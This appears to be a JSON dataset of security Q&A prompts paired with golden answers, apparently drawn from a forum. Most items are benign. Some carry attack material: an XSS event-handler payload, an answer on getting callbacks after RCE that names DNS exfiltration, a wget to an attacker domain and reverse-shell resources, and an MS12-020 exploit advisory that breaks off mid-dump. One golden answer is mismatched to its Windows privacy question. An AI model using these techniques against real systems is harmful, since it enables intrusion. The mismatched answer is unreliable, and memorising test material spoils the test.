        "prompt": "\n\nHuman: <p>I was <a href=\"https://who.is/whois/poaulpos.net\">looking</a> at the domain information of a website (<code>poaulpos.net</code>) on <code>who.is</code> that Chrome connects to whenever I visit a specific an old Tech Times article about Thunderstrike 2, a Mac firmware attack (\"Thunderstrike 2 Is The Latest Nightmare Of Mac Owners\"). I have Little Snitch, an application based firewall, so I blocked it the first time Chrome attempted to connect to it.</p>\n\n<p>My question is very basic: clicking on the diagnostics tab of any who.is entry automatically runs a ping and a traceroute on the website. Is that more or less like visiting the website by typing the hostname into your browser and letting it load?</p>\n\n<p>The website in question was only registered yesterday and contact information is Whoisguard protected. I'm pretty paranoid. I'm suspicious of the website and am worried if somehow, I could've just allowed something malicious onto my laptop by attempting to reach the website via the who.is diagnostics tab.</p>\n\n\nAssistant:",
        "golden_answer": " <p><strong>They are not the same at all.</strong></p>\n\n<p>A ping request is an <a href=\"https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol\" rel=\"nofollow noreferrer\">ICMP</a> packet which just by default sends <code>null</code> data to check if the host is up (You can change around the parameters being sent (read more <a href=\"https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol\" rel=\"nofollow noreferrer\">here</a>).)</p>\n\n<p>When you visit a website in the browser you are using the <a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol\" rel=\"nofollow noreferrer\">HTTP</a> protocol which requests data and so you have a <a href=\"https://en.wikipedia.org/wiki/Client%E2%80%93server_model\" rel=\"nofollow noreferrer\">CLIENT/SERVER</a> setup here (data is served to the client from server upon a request that is sent in the HTTP protocol).</p>\n\n<p>Either way, if you are not the one sending the request but rather the service (<code>poaulpos.net</code>) you are using sends it, there is no traceback to you and therefore no security risk for you.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I am connecting to a server</p>\n\n<pre><code>nc -v 192.168.0.1 1111\n</code></pre>\n\n<p>But I want to do IP spoofing because the server on 192.168.0.1 only accepting commands from 7.7.7.7. We are two friends, I am 192.168.1.1, and my friend is 192.168.0.1. My friend installed a daemon (on port 1111) and runs</p>\n\n<pre><code>ncat -u -c /bin/bash --allow 7.7.7.7 -l 1111\n</code></pre>\n\n<p>I know netcat's <code>-s</code> parameter, but I don't know how to use it. I tried</p>\n\n<pre><code>nc -v 192.168.0.1 1111 -s 7.7.7.7\n7.7.7.7: inverse host lookup failed: Unknown server error : Connection timed out\n</code></pre>\n\n<p>How can I use netcat to connect with a spoofed IP address?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Netcat does not support IP-spoofing. Also, when there is one or more routers in between, the odds that IP-spoofing will be working is zero. When using 192.168.1.x and 192.168.0.y having a router in between is very likely.</p>\n\n<p>Also 7.7.7.7 is a publicly assigned address. You cannot use it for your own.</p>\n\n<p>If you want to experiment with other IP-addresses, use addresses from these ranges:</p>\n\n<ul>\n<li>10.x.y.z</li>\n<li>172.24.0.0 - 172.31.255.255</li>\n<li>192.168.x.y</li>\n</ul>\n\n<p>netcat needs to bind to an IP address that is available on your computer. You can check those by typing <code>sudo ifconfig -a</code>. Notice that all 127.x.y.z addresses are loopback addresses and only exist inside your own PC.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>What do I have to do to secure a WiFi network? Is there any best practices?</p>\n\n<p>I have been recommended to use WPA2 encryption on the router, is that enough? What can I do to improve the security even more? Is it recommended to only allow specific MAC-addresses, or isn't that needed?</p>\n\n<p>I have heard that if someone else set up a WiFi net with the same SSID and stronger signal strength, my computer will connect to that network instead of my own. What can I do to protect against that?</p>\n\n\nAssistant:",
        "golden_answer": " <ul>\n<li>I take it when you say WPA2 you mean WPA2-Personal. It is good enough in most cases at the moment as long as its combined with a really good password. <a href=\"https://www.grc.com/passwords.htm\" rel=\"noreferrer\">https://www.grc.com/passwords.htm</a> is a good generator for them.</li>\n<li>Disable Wi-Fi Protected Setup (WPS). Otherwise, an attacker only needs to break an 8 digit PIN -- and that is perfectly doable.</li>\n<li>Cloak your SSID. It won't stop a determined attacker but will stop some of the script kiddie like attackers. </li>\n<li>Only allowing specific MAC addresses can be a good step to manage user access. But once again won't really slow down a determined attacker, as they can just see what MAC addresses are currently connected to wireless in plain text anyway. </li>\n<li>If possible a good tactic to reduce the chance of your WiFi being attacked is to position your wireless access point well so that the minimum amount of signal is broadcast outside of your building. That way the attacker needs to be closer to start the attack unless they have improved wireless antennas to grab from miles away. </li>\n</ul>\n\n<p>Yes people can broadcast a stronger signal to try and get you to connect to them instead of your actual desired access point using tools like <a href=\"http://www.theta44.org/karma/\" rel=\"noreferrer\">Karma</a>. I don't know any specific ways to protect against this except not to allow any automatic associations instead each time you wish to connect to wireless, you should do it manually and verify you are connecting to the correct access point. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've found the following <a href=\"http://www.yeahhub.com/cehv9-practice-exam-questions/chapter3-cryptography.php\" rel=\"nofollow noreferrer\">question</a> on the internet and don't think the answer is right.</p>\n<pre><code>Which of the following does IPsec use?\n\n    A) SSL\n    B) AES\n    C) DES\n    D) PKI \n</code></pre>\n<p>The given answer is D, PKI which is totally different technology than IPsec.</p>\n<p>I believe the answer should be B, as IPsec is using AES as the cryptographic algorithms.</p>\n<p>What do you think about this? Is the given answer's right or wrong?</p>\n<p><strong>Reference:</strong>\n<a href=\"https://www.rfc-editor.org/rfc/rfc7321\" rel=\"nofollow noreferrer\">https://www.rfc-editor.org/rfc/rfc7321</a></p>\n\n\nAssistant:",
        "golden_answer": " <p>This Yeh Hub questionnaire itself isn't as educational as it could be. While it tries to simplify complex things by asking simple questions with right and wrong answers, it doesn't really explain why these answers are considered right or wrong, and leaves this reflection entirely to the user. The correct mindset while using this kind of questionnaires is trying to understand the concepts and technologies rather than memorizing the (presumably) correct answers.</p>\n\n<p><a href=\"http://www.unixwiz.net/techtips/iguide-ipsec.html\" rel=\"nofollow noreferrer\">An Illustrated Guide to IPsec</a> by Steve Friedl explains clearly, why this question is not so simple:</p>\n\n<blockquote>\n  <p>One cause of the complexity is that IPsec provides mechanism, not\n  policy: rather than define such-and-such encryption algorithm or a\n  certain authentication function, it provides a framework that allows\n  an implementation to provide nearly anything that both ends agree\n  upon.</p>\n</blockquote>\n\n<p>Therefore, there really is more than just one correct answer to this, and the answers aren't limited to the given options. On the other hand, if the question was <em>Which of the following does IPsec <strong>always</strong> use?</em>, non of these would have been true:</p>\n\n<ul>\n<li><p><strong>SSL</strong>. While IPsec works on <em>internet layer</em>, the SSL/TLS is an <em>application layer</em> protocol. As @ecdsa mentions, IPsec may utilize SSL via IKEv2 (EAP-TLS/TTLS/PEAP), but it's not a central part of IPsec itself; IPsec establishes the mutual authentication that can utilize SSL.</p></li>\n<li><p><strong>AES</strong> / <strong>DES</strong>. Just two of the many possible encryption algorithms IPsec can use.</p></li>\n<li><p><strong>PKI</strong>. Again related to IPsec and even useful, but not entirely necessary. The secret keys could be manually configured i.e. pre-shared, too, without need for PKI.</p></li>\n</ul>\n\n<p>So, either all or none are true. PKI might be <em>closer</em> just because it's involved whenever IKE is using DNSSEC for distributing keys for the encryption protocols listed in the other options. If the question was further limited using \"<em>always</em>\", only <em>authentication</em> would've been mutual to each and every IPsec implementation, since even encryption is optional.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>For as long as can remember, EICAR has been used to test for the presence of Antivirus systems in email, the file system, or other places.</p>\n\n<p>Sometimes the AV solution is so far out of date, that its efficacy is basically zero.  </p>\n\n<blockquote>\n  <p>That leads me to question why have support for EICAR at all?  Is this test obsolete, and should it be removed?</p>\n</blockquote>\n\n<p>To me it seems logical to extend that line of questioning with this:</p>\n\n<blockquote>\n  <p>Would it be beneficial for EICAR to also test for the freshness of the AV update files?<br>\n  Perhaps effectively saying \"Only trigger AV alerts if signatures are newer than x/x/x date\"?</p>\n</blockquote>\n\n\nAssistant:",
        "golden_answer": " <p>The purpose of EICAR is to provide a cross vendor file that will be detected as a virus. Why? Well, imagine you are building a web application that allows user uploaded content, for example. Into this solution, because you are security-conscious, you might want to scan the uploaded files and remove those files that are malicious before you spread them to other users in your userbase. Many antivirus vendors provide command-line executables and solutions that can do this; what you then need, as a software engineer, is something to test this construction with, either automatically as part of unit/functionality/UI testing or just plain old &quot;did it work&quot; testing.</p>\n<p>Enter the EICAR test file - a file all virus vendors have agreed will produce a positive response. As the <a href=\"http://www.eicar.org/86-0-Intended-use.html\" rel=\"noreferrer\">intended use page</a> puts it:</p>\n<blockquote>\n<p>Using real viruses for testing in the real world is rather like setting fire to the dustbin in your office to see whether the smoke detector is working. Such a test will give meaningful results, but with unappealing, unacceptable risks.</p>\n<p>Since it is unacceptable for you to send out real viruses for test or demonstration purposes, you need a file that can safely be passed around and which is obviously non-viral, but which your anti-virus software will react to as if it were a virus.</p>\n</blockquote>\n<p>My understanding is that you do not use the EICAR test file to audit the status of your antivirus products and how up to date they are; you use them to test, in integration scenarios, a case where malware exists without using real, actual malware.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Are there ways to monitor and check for network monitoring like WireShark?</p>\n\n<p>Or would it just be more ideal to ensure every application uses SSL to ensure no employee or anyone could packet sniff chats/emails for information.</p>\n\n\nAssistant:",
        "golden_answer": " <p>There is no way to do that unless you can monitor the installed programs on your users´ PCs with a software like EMCO Software scanner.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Recently, I got a new credit card via post. To activate it, it is required to call to the bank (phone number is attached to the card) and confirm, that card was received. For activation purposes, the bank employee asks me to provide full card number, as well as my name/address/etc.</p>\n\n<p>However, I do not use phone banking so often, and I was not sure if it is safe to tell my card number over phone.</p>\n\n<p>So, are there any security risks of doing this (except Man-In-The-Middle, listening to my phone communication)?</p>\n\n\nAssistant:",
        "golden_answer": " <p>If you consider how credit cards are used there is no increased security risk associated with providing the bank employee with the card number and your name and address.</p>\n\n<p>For example if you use the card for mail order purchases you will provide the same detail, but also the CVV code and expiry date a greater level of risk...but this is how they are intended to be used!</p>\n\n<p>Similarly for any 'in-person' transactions, often the retailer will have full access to all the details from the card, albeit normally without address details.</p>\n\n<p>Given that you are phoning the bank, by implication the person you are providing the details to is trusted by the bank...for the vast majority of subsequent card use scenarios there will not be as much trust in the person you provide the information to.</p>\n\n<p>If the phone call requires you to 'authenticate' using a telephone banking password or phrase of some description, this can help to ensure that someone who has intercepted your post and stolen the newly issued card cannot activate it and use it.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I'm somewhat confused as to the technical details of the Oct. 21 DDoS. Dyn is a company, which according to <a href=\"https://en.wikipedia.org/wiki/Dyn_(company)\" rel=\"nofollow\">wikipedia</a> </p>\n\n<blockquote>\n  <p>is an Internet performance management company, offering products to\n  monitor, control, and optimize online infrastructure, and also domain\n  registration services and email products.</p>\n</blockquote>\n\n<p>I'm assuming they own a popular DNS server which was attacked? I've heard two claims in the news which confuse me</p>\n\n<ol>\n<li>certain geographic areas were affected, namely western US and western Europe</li>\n<li>certain sites were affected, such as Twitter.</li>\n</ol>\n\n<p>How could taking down a DNS server affect particular locations? Is the idea that people tend to use DNS servers geographically closest to them so it would be logical that those physically closest to the servers would be the most affected?</p>\n\n<p>How could certain sites (such as Twitter) be more affected than others?</p>\n\n<p>Is this likely the work of a state sponsored actor and if so, what's the point in pursuing them? It's not like North Korea's going to allow the FBI to extradite someone who attacked the US. Seriously though, are there any international bodies that could prosecute \"crimes\" (if it's considered one) like this?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The largest Internet sites, Content Distribution Networks (CDN's), search engines, and companies that do things like streaming video leverage geographically load-balanced DNS which means when you look for their DNS servers from different parts of the world or from different ISP's you get different results. The following are two tests run against github.com from different parts of the US. In the example below you might notice that an attack against dynect.com will affect the Dallas users but not the Seattle ones. This geographically load-balanced DNS is why it was affecting some people and not others. The fact that many companies use different DNS providers is why it only affected some companies. </p>\n\n<p><strong>dig -t NS github.com (from Dallas)</strong></p>\n\n<pre><code>; &lt;&lt;&gt;&gt; DiG 9.8.1-P1 &lt;&lt;&gt;&gt; -t NS github.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 49558\n;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;github.com.            IN  NS\n\n;; ANSWER SECTION:\ngithub.com.     25147   IN  NS  ns4.p16.dynect.net.\ngithub.com.     25147   IN  NS  ns1.p16.dynect.net.\ngithub.com.     25147   IN  NS  ns2.p16.dynect.net.\ngithub.com.     25147   IN  NS  ns3.p16.dynect.net.\n\n;; Query time: 2 msec\n;; SERVER: 173.203.4.8#53(173.203.4.8)\n;; WHEN: Sat Oct 22 06:24:33 2016\n;; MSG SIZE  rcvd: 114\n</code></pre>\n\n<p><strong>dig -t NS github.com   (from Seattle)</strong></p>\n\n<pre><code>; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; -t NS github.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47222\n;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;github.com.            IN  NS\n\n;; ANSWER SECTION:\ngithub.com.     586 IN  NS  ns-1283.awsdns-32.org.\ngithub.com.     586 IN  NS  ns-1707.awsdns-21.co.uk.\ngithub.com.     586 IN  NS  ns-421.awsdns-52.com.\ngithub.com.     586 IN  NS  ns-520.awsdns-01.net.\n\n;; Query time: 78 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)\n;; WHEN: Fri Oct 21 23:24:17 2016\n;; MSG SIZE  rcvd: 165\n</code></pre>\n\n<p>Tests run within a minute of each other (clock offset because one was a server and the other is from my laptop).</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>We are currently using <strong>HMACSHA512</strong> in .net, with a <strong>128Char (64byte) validation key</strong>\nThe <strong>salt is 64 char randomly generated</strong> string.\nWe allocated 2048 length on the database for the hashed base64 string result.\nIt will be a public facing website.\n<strong>Is this approach reasonable</strong> or should it be changed to another approach such as Rfc2898DeriveBytes?</p>\n<pre><code> public string HashEncode(string password, string salt, string validationKey) {\n        byte[] hashKey = BosUtilites.HexStringToByteArray(validationKey);\n        var sha512 = new HMACSHA512(hashKey);\n        var hashInput = BosUtilites.StringToByteArray(password + salt);\n        byte[] hash = sha512.ComputeHash(hashInput);\n        return Convert.ToBase64String(hash);\n    }\n\n public string GenerateSimpleSalt(int Size = 64) {\n        var alphaSet = new char[64]; // use 62 for strict alpha... that random generator for alphas only\n        //nicer results with set length * int i = 256. But still produces excellent random results.\n        //alphaset plus 2.  Reduce to 62 if alpha requried\n        alphaSet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890#=&quot;.ToCharArray();\n        var tempSB = GenerateRandomString(Size, alphaSet);\n        return tempSB.ToString();\n    }\n\n    public StringBuilder GenerateRandomString(int Size, char[] alphaSet) {\n        using (var crypto = new RNGCryptoServiceProvider()) {\n            var bytes = new byte[Size];\n            crypto.GetBytes(bytes); //get a bucket of very random bytes\n            var tempSB = new StringBuilder(Size);\n            foreach (var b in bytes) { // use b , a random from 0-255 as the index to our source array. Just mod on length set\n                tempSB.Append(alphaSet[b%(alphaSet.Length)]);\n            }\n\n            return tempSB;\n        }\n</code></pre>\n<p><strong>EDIT2: In case Someone finds this via google, I have included the lessons learnt</strong>\nAverage sample in tests on workstations was around 300 msecs. This should not be too noticeable during logon.  And no more need for a Validation key. Which is a relief :-)</p>\n<pre><code> SCrypt package installed via nuget. and rfc2898 PBKDF2 changed to be large number or iterations but only 20bytes output.  SAme CPU time.\n</code></pre>\n<p>New passwords are encoded in SCRYPT by default,</p>\n<pre><code>  &lt;package id=&quot;CryptSharpOfficial&quot; version=&quot;2.0.0.0&quot; targetFramework=&quot;net451&quot; /&gt;\n  // save salt, hash algorithm used and resulting encoding on user record\n  public string PasswordEncode(string password, byte[] salt, HashAlgorithm hashAlgorithm ) {\n        switch (hashAlgorithm) {\n            case HashAlgorithm.PBKDF2:\n                    var deriver2898 = new Rfc2898DeriveBytes(password, salt,&lt;Use a number around 50K&gt;); // approx 300msecs on workstation\n                    byte[] hash = deriver2898.GetBytes(20); // \n                    return Convert.ToBase64String(hash);\n            case HashAlgorithm.Scrypt:\n                var key = Encoding.UTF8.GetBytes(password);\n                byte[] hashScrypt =  SCrypt.ComputeDerivedKey(key: key, salt: salt, \n                                    cost: 65536, // must be a power of 2 !, on PC, singlethread this is approx 1 sec\n                                    blockSize: 8, \n                                    parallel: 1,\n                                    maxThreads: 1, \n                                    derivedKeyLength: 128);\n             \n                    return Convert.ToBase64String(hashScrypt);\n            default:\n                throw new ArgumentOutOfRangeException(&quot;hashAlgorithm&quot;);\n        }\n    }\n</code></pre>\n<p>**EDIT 3:   Latest Library Bcrypt.Net-Next 4.x<br />\nThis Bcrypt library offers an up to date solution to the hashing process.  For more details see why we selected bcrypt.<br />\n<a href=\"https://security.stackexchange.com/questions/4781/do-any-security-experts-recommend-bcrypt-for-password-storage\">Do any security experts recommend bcrypt for password storage?</a></p>\n\n\nAssistant:",
        "golden_answer": " <p><code>Rfc2898DeriveBytes</code> implements <a href=\"http://en.wikipedia.org/wiki/PBKDF2\" rel=\"nofollow noreferrer\">PBKDF2</a>: a function which turns a password (with a salt) into an arbitrary-length sequence of bytes. PBKDF2 is often used for password hashing (i.e. to compute and store a value which is sufficient to <em>verify</em> a password) because it has the needed characteristics for password hashing functions: a <em>salt</em> and <em>configurable slowness</em>.</p>\n\n<p>These characteristics are needed because <strong>passwords are weak</strong>: they fit in human brain. As such, they are vulnerable to exhaustive search: it is feasible, on a general basis, to enumerate most passwords that human users will come up with and remember. The attack assumes that the attacker got a copy of the salt and the hashed password, and then will \"try passwords\" on his own machine. That's called an <a href=\"http://en.wikipedia.org/wiki/Dictionary_attack\" rel=\"nofollow noreferrer\">offline dictionary attack</a>.</p>\n\n<p>In your case, you have a third element: a <em>validation key</em>. It is a <em>key</em>, i.e. supposedly secret. <strong>If</strong> the attacker could grab the salts and hashed passwords but <em>not</em> the validation key, then he cannot perform the dictionary attack on his own machines; <strong>under these conditions</strong> (the validation key remains secret, and the validation algorithm is robust -- HMAC/SHA-512 is fine for that), the configurable slowness of PBKDF2 is not needed. This kind of validation with a secret key is sometimes called \"peppering\".</p>\n\n<p>Note, though, that when we assume that the attacker could grab a copy of the hashed passwords, then it becomes a matter of delicacy to suppose that the key remained unsullied by his vile glances. This depends on the context. Most SQL injection attacks will be able to read part of all of the database, but not the rest of the files on the machine. Nevertheless, your server must somehow be able to boot up and start without human intervention, so the validation key is somewhere on the disk. An attacker stealing the whole disk (or a backup tape...) will get the validation key as well -- at which point you are back to the need for configurable slowness.</p>\n\n<p>Generally speaking, I would recommend PBKDF2 (aka <code>Rfc2898DeriveBytes</code> in .NET) over a custom construction, although I must say that you appear to use HMAC properly (homemade constructions rarely achieve that level of correctness). If you insist of having a \"validation key\" (and you are ready to assume the procedural overhead of key management, e.g. special backups for that key), then I suggest using PBKDF2 and <em>then</em> applying HMAC on the PBKDF2 output.</p>\n\n<p>See <a href=\"https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords/31846#31846\">this answer</a> for a detailed discussion on password hashing.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Suppose only user-supplied double quotes are allowed in an <code>input</code> tag which has the <code>style</code> attribute set to <code>display: none</code>.</p>\n\n<p>Something like this:</p>\n\n<pre><code>&lt;input type=\"text\" style=\"display: none;\" value=\"aa\" autofocus/onfocus=\"prompt(1)\"&gt;\n</code></pre>\n\n<p>Since the injection point is behind the style attribute, is it still possible to get XSS by triggering an event handler?</p>\n\n\nAssistant:",
        "golden_answer": " <p>You can always use the same approach which may be used for <a href=\"https://security.stackexchange.com/questions/175304/how-to-perform-xss-in-hidden-html-input-fields-using-accesskey\">hidden input</a>, but this requires quite a bit of social engineering as it's difficult to trigger.</p>\n\n<p>You can however use a different event attribute which may be easier to trigger. <code>oninvalid</code> comes to mind as it doesn't require the element to be shown:</p>\n\n<pre><code>&lt;form&gt;\n&lt;input type=\"text\" style=\"display: none;\" value=\"aa\" oninvalid=\"alert(1)\" pattern=\"b\"&gt;\n&lt;input type=\"submit\" value=\"Submit\"&gt;\n&lt;/form&gt;\n</code></pre>\n"
    },
    {
        "prompt": "\n\nHuman: <p>How do I find out if a certificate is self-signed or authorized by CA? Somewhere I read that self-signed <em>subject</em> and <em>issuer</em> will be same, is it correct?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Yes it is true. When certificate is self-signed, then <em>issuer</em> and <em>subject</em> field contains the same value. Also, there will be only this one certificate in the certificate path.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Can someone explain a technique when I know that I can expoit RCE on a server that is located in an internal network but I don't understand how to get a reply back from the payload once it gets inside the server?</p>\n\n\nAssistant:",
        "golden_answer": " <p>It could be that some of the outgoing traffic from the server is blocked. Upon gaining a RCE there are various techniques to check if you can get a connection back:</p>\n\n<ul>\n<li><p>Try ping yourdomain.xx - Check if your domains DNS query is executed by the victim server, if it is, that means you can setup a shell through DNS. You can use a tool like <a href=\"https://github.com/iagox86/dnscat2\" rel=\"nofollow noreferrer\">https://github.com/iagox86/dnscat2</a>, or just manually exfiltrate data with DNS TXT records.</p></li>\n<li><p>If for some reason that doesn't work, you can check if outbound 443 port is open by doing a simple wget <a href=\"https://yourdomain.xx/curl\" rel=\"nofollow noreferrer\">https://yourdomain.xx/curl</a> -k <a href=\"https://yourcomain.xx\" rel=\"nofollow noreferrer\">https://yourcomain.xx</a>. You can use a tool like <a href=\"https://github.com/EmpireProject/Empire.git\" rel=\"nofollow noreferrer\">https://github.com/EmpireProject/Empire.git</a> to eastablish a shell, remember to setup a certificate as well.</p></li>\n<li><p>If that fails, than you can just check for other open ports ports here's a nice list of reverse TCP shells <a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\" rel=\"nofollow noreferrer\">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>, but I would advise against using them if you are traversing a perimeter firewall and public network, they get detected/blocked easily.</p></li>\n</ul>\n\n<p>In summary:</p>\n\n<ol>\n<li>Check what you can reach</li>\n<li>Use that to create a shell</li>\n<li>Do whatever you came to do </li>\n</ol>\n\n<p>*This is not intended as a deep dive explanation, but just as an example of some of the techniques you can use</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>An NHS doctor I know recently had to do their online mandatory training questionnaire, which asks a bunch of questions about clinical practice, safety and security. This same questionnaire will have been sent to all the doctors in this NHS trust.</p>\n\n<p>The questionnaire included the following question:</p>\n\n<blockquote>\n  <p>Which of the following would make the most secure password? Select one:</p>\n  \n  <p>a. 6 letters including lower and upper case.<br>\n  b. 10 letters a mixture of upper and lower case.<br>\n  c. 7 characters that include a mixture of numbers, letters and special characters.<br>\n  d. 10 letters all upper case.<br>\n  e. 5 letters all in lower case.</p>\n</blockquote>\n\n<p>They answered \"b\", and they lost a mark, as the \"correct answer\" was apparently \"c\".</p>\n\n<p>It is my understanding that as a rule, extending password length adds more entropy than expanding the alphabet. I suppose the NHS might argue that people normally form long passwords out of very predictable words, making them easy to guess. But if you force people to introduce \"special characters\" they also tend to use them in very predictable ways that password guessing algorithms have no trouble with.</p>\n\n<p>Although full disclosure, I'm not a password expert - I mostly got this impression from Randall Munroe (click for discussion):</p>\n\n<p><a href=\"https://security.stackexchange.com/q/6095/79319\"><img src=\"https://imgs.xkcd.com/comics/password_strength.png\" alt=\"password strength\"></a></p>\n\n<p>Am I wrong?</p>\n\n\nAssistant:",
        "golden_answer": " <p>By any measure, they're wrong:</p>\n\n<p>Seven random printable ASCII: 95<sup>7</sup> = 69 833 729 609 375 possible passwords.</p>\n\n<p>Ten random alphabetics: 52<sup>10</sup> = 144 555 105 949 057 024 possible passwords, or over 2000 times as many.</p>\n\n<p>Length counts.  If you're generating your passwords randomly, it counts for far more than any other method of making them hard to guess.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have a Windows 10 pro license and i wanted to use Windows 10. But seeing how it treats the user's privacy and all, I am having second thoughts. I've read a lot about how Windows 10 is a disaster and all, but i want to hear it from some pros with experience in these kinds of stuff. So, as a person who's concerned with privacy, what are things we should watch out for, if we wanted to use Windows 10 ? Or any version of Windows for that matter? </p>\n\n<p>Right now i use Kali 2.0 for home/research and Fedora 22 for work. </p>\n\n\nAssistant:",
        "golden_answer": " <p>Anything provided by the client to the server can be altered by the client, including any HTML content/tags.</p>\n\n<p>Look at products like Burp Proxy to give you an idea about the power available to the client. It allows you to manually intercept responses then inspect and edit them before sending. It's a very common tool for hackers (and security pros) to use. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>The <a href=\"https://en.wikipedia.org/wiki/Diceware\" rel=\"nofollow noreferrer\">Diceware</a> method of password generation is simple, secure and easy to use</p>\n\n<p>When registering an account on a website</p>\n\n<ul>\n<li>Why do websites not suggest to their users to use the diceware method?</li>\n<li>Why do websites not include a diceware based password generator?</li>\n<li>What other reasons make this a bad idea?</li>\n</ul>\n\n\nAssistant:",
        "golden_answer": " <p>It might not be a bad idea, but it's not worth it anyway. Here's a few reasons I can think of:</p>\n\n<ul>\n<li>Implementing a secure password generator is not trivial, so that would be one more problem for the site developers to think about.</li>\n<li>Recommending strong random passwords on every website means that the user will end up having a different strong random password for every website. But to manage them they will need a password manager, because they can't remember all those passwords. And password managers usually already include a strong random password generator, so what's the purpose of implementing another one on the websites?</li>\n<li>Very strong passwords are not even needed for online services, because bruteforcing is relatively slow and it's pretty easy to detect. So detecting attacks, throttling and banning are a better investment.</li>\n<li>Using online password generators that you can't trust is considered bad practice by many security professionals. Even if the risks are mitigated by only using the password on the same website that generated it, it would still feel wrong. And I don't think it's a good idea to implement something that to many experts is going to \"feel wrong\". So it's yet another reason to stick to the common best practices and generate your own passwords offline.</li>\n</ul>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've recently looked a bit into the MS vulnerability CVE-2012-0002/MS12-020, released in 2012.</p>\n\n<p>In March 2012, Symantec <a href=\"https://www.symantec.com/connect/blogs/working-poc-ms12-020-spotted-wild\" rel=\"nofollow noreferrer\">posted</a> a screenshot of a supposedly RCE PoC for the vulnerability, but today I still can't find a decent RCE PoC.</p>\n\n<p>I've come across <a href=\"http://www.securityfocus.com/bid/52353/exploit\" rel=\"nofollow noreferrer\">these three PoCs</a>, but without proper comments or documentation and as of now I'm not confident enough to validate the functionality myself.</p>\n\n<p>Is there is a RCE PoC for MS12-020 and is it still exploited in the wild?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Yes. There is a published exploit on <a href=\"https://www.exploit-db.com/exploits/18606/\" rel=\"nofollow noreferrer\">exploit-db.com</a>. If you are not comfortable validating the exploit code, you should familiarize yourself with how code at this level (read: assembly) works prior to attempting this. </p>\n\n<pre><code>#######################################################################\n\n                             Luigi Auriemma\n\nApplication:  Microsoft Terminal Services / Remote Desktop Services\n              http://www.microsoft.com\n              http://msdn.microsoft.com/en-us/library/aa383015(v=vs.85).aspx\nVersions:     any Windows version before 13 Mar 2012\nPlatforms:    Windows\nBug:          use after free\nExploitation: remote, versus server\nDate:         16 Mar 2012 (found 16 May 2011)\nAuthor:       Luigi Auriemma\n              e-mail: aluigi@autistici.org\n              web:    aluigi.org\n\nAdditional references:\n http://www.zerodayinitiative.com/advisories/ZDI-12-044/\n http://technet.microsoft.com/en-us/security/bulletin/ms12-020\n\n\n#######################################################################\n\n\n1) Introduction\n2) Bug\n3) The Code\n4) Fix\n\n\n#######################################################################\n\n===============\n1) Introduction\n===============\n\n\nFrom vendor's homepage:\n\"The Microsoft Remote Desktop Protocol (RDP) provides remote display\nand input capabilities over network connections for Windows-based\napplications running on a server. RDP is designed to support different\ntypes of network topologies and multiple LAN protocols.\"\n\n\n#######################################################################\n\n======\n2) Bug\n======\n\n\nThe Remote Desktop Protocol is used by the \"Terminal Services / Remote\nDesktop Services\" and works at kernel level on port 3389.\n\nThere is an use-after-free vulnerability located in the handling of the\nmaxChannelIds field of the T.125 ConnectMCSPDU packet (offset 0x2c of\nthe provided proof-of-concept) when set to a value minor/equal than 5.\n\nThe problem happens during the disconnection of the user started with\nRDPWD!NM_Disconnect while the effect of the possible code execution is\nvisible in termdd!IcaBufferAlloc (or termdd!IcaBufferAllocEx on\nWindows 7/2008) after termdd!IcaGetPreviousSdLink returns an invalid\nmemory pointer, the following dump is taken from Windows 2003 Server:\n\n  f761887c 8bff            mov     edi,edi\n  f761887e 55              push    ebp\n  f761887f 8bec            mov     ebp,esp\n  f7618881 56              push    esi\n  f7618882 57              push    edi\n  f7618883 8b7d08          mov     edi,dword ptr [ebp+8]\n  f7618886 8d47ec          lea     eax,[edi-14h]\n  f7618889 50              push    eax\n  f761888a eb09            jmp     termdd!IcaBufferAlloc+0x19 (f7618895)\n  f761888c 8b4618          mov     eax,dword ptr [esi+18h]                  ; we are here\n  f761888f 833800          cmp     dword ptr [eax],0                        ; or here\n  f7618892 7527            jne     termdd!IcaBufferAlloc+0x3f (f76188bb)    ; must jump\n  f7618894 56              push    esi\n  f7618895 e878290000      call    termdd!IcaGetPreviousSdLink (f761b212)   ; the new ESI is returned by this function\n  f761889a 8bf0            mov     esi,eax\n  f761889c 85f6            test    esi,esi\n  f761889e 75ec            jne     termdd!IcaBufferAlloc+0x10 (f761888c)\n  f76188a0 ff751c          push    dword ptr [ebp+1Ch]\n  f76188a3 ff7518          push    dword ptr [ebp+18h]\n  f76188a6 ff7514          push    dword ptr [ebp+14h]\n  f76188a9 ff7510          push    dword ptr [ebp+10h]\n  f76188ac 